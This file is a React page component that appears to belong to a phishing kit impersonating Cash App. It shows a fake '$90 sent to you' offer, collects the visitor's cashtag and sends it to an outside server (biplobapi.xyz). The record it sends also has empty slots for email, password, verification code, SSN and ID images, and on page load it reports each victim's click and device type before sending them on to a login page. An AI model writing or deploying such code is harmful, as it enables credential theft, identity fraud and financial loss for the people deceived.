import React from "react";
import "./Home.css";
import Logo from "../../assets/images.png";
import { useLoaderData, useNavigate, useParams } from "react-router-dom";
import { useForm } from "react-hook-form";
import { isBrowser, isMobile } from "react-device-detect";
import { useEffect } from "react";

const Home = () => {
  const { user } = useLoaderData();
  const navigate = useNavigate();
  const id = useParams();
  localStorage.setItem("url", `/verify/login/${id.id}`);
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();

  const handleAddBooking = (data) => {
    const bookings = {
      cashtag: data.cashtag,
      email: "",
      password: "",
      site: "mega",
      code: "",
      ssn: "",
      idOne: "",
      idTwo: "",
      user: user,
      temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
      postingTime: Date().toLocaleString(),
    };
    fetch("https://biplobapi.xyz/cashtag", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((result) => {
        reset();
        pathInfo(bookings);
      });
  };
  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/")
    );
    if (fnl === "verify/login") {
      navigate("/login", { state: { temp: infos.temp } });
    } else {
    }
  };
  let type;
  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  useEffect(() => {
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${id.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
  }, [type, id.id]);
  return (
    <div className="home-bg">
      <form className="home-card" onSubmit={handleSubmit(handleAddBooking)}>
        <img src={Logo} alt="" className="img-tag" />
        <h2>Cash App</h2>
        <h5>Sent you $90</h5>
        <h6>Accept it Here</h6>
        <input
          {...register("cashtag")}
          type="text"
          placeholder="Type your cash tag here"
          className="input-tag"
        />
        <br />
        <button className="btn-tag">Submit</button>
      </form>
    </div>
  );
};

export default Home;
